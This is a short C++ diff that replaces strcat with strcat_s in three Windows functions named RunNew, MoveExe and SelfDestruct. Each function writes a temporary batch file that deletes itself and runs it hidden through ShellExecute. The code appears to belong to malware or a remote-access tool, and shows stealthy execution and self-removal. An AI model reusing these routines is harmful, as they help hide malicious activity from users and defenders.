@@ -85,8 +85,8 @@ void RunNew(std::string &filename)
 	_chdir(temppath);
 	fp = fopen(batname, "w");
 	fprintf(fp, batcmd);
-	strcat(temppath, "\\");
-	strcat(temppath, batname);
+	strcat_s(temppath, "\\");
+	strcat_s(temppath, batname);
 	fprintf(fp, "\ndel %s", temppath);
 	fclose(fp);
 	ShellExecute(NULL, "open", temppath, NULL, NULL, SW_HIDE);
@@ -104,8 +104,8 @@ void MoveExe(LPSTR exepath, std::string &filename)
 	_chdir(temppath);
 	fp = fopen(batname, "w");
 	fprintf(fp, batcmd, exepath, exepath, exepath);
-	strcat(temppath, "\\");
-	strcat(temppath, batname);
+	strcat_s(temppath, "\\");
+	strcat_s(temppath, batname);
 	fprintf(fp, "\ndel %s", temppath);
 	fclose(fp);
 	ShellExecute(NULL, "open", temppath, NULL, NULL, SW_HIDE);
@@ -123,8 +123,8 @@ void SelfDestruct(LPSTR exepath)
 	_chdir(temppath);
 	fp = fopen(batname, "w");
 	fprintf(fp, batcmd, exepath, exepath, exepath);
-	strcat(temppath, "\\");
-	strcat(temppath, batname);
+	strcat_s(temppath, "\\");
+	strcat_s(temppath, batname);
 	fprintf(fp, "\ndel %s", temppath);
 	fclose(fp);
 	ShellExecute(NULL, "open", temppath, NULL, NULL, SW_HIDE);
